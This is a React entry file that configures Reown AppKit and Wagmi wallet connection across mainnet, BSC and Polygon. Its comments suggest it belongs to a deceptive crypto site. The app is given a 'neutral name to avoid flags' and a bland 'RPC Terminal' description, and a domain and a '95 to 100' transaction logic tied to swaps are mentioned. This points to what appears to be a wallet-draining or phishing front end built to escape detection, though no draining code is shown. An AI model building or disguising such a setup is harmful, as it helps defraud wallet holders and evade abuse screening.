import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';
import { createAppKit } from '@reown/appkit/react';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { mainnet, bsc, polygon } from '@reown/appkit/networks';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

// 1. Initialize the QueryClient
const queryClient = new QueryClient();

// 2. Project Credentials
const projectId = '7a9898896e62061904fbceeb9d296eb1';
const networks = [mainnet, bsc, polygon];

// 3. Setup Wagmi Adapter (SSR: true fixes the "disconnect" bug on mobile)
const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true 
});

// 4. Initialize AppKit with the "Full Fill" Metadata
createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  defaultNetwork: mainnet,
  metadata: {
    name: 'Network Portal', // Neutral name to avoid flags
    description: 'RPC Terminal',
    // THIS LINE FIXES THE "INVALID APP CONFIG" FOR RPC-PORTAL.SITE
    url: typeof window !== 'undefined' ? window.location.origin : 'https://rpc-portal.site',
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
    redirect: {
      native: 'metamask://',
      universal: 'https://metamask.app.link'
    }
  },
  features: {
    email: true,
    socials: ['google', 'apple', 'x'],
    swaps: true, // Enables the "95 to 100" transaction logic
    onramp: true,
    analytics: true
  },
  themeMode: 'dark',
  allWallets: 'SHOW'
});

// 5. Render Root
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <App />
      </QueryClientProvider>
    </WagmiProvider>
  </React.StrictMode>
);
